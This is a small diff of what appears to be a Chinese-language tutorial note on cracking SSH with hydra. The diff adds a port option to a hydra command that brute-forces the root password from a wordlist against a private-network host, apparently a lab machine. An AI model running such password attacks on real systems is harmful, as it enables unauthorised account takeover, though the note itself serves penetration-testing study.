@@ -29,4 +29,4 @@ tags:
 
 用hydra破解ssh
 
-`hydra -l root -P 字典 -t 4  ssh://192.168.27.128`
+`hydra -l root -P 字典 -t 4 -s 9625  ssh://192.168.27.128`
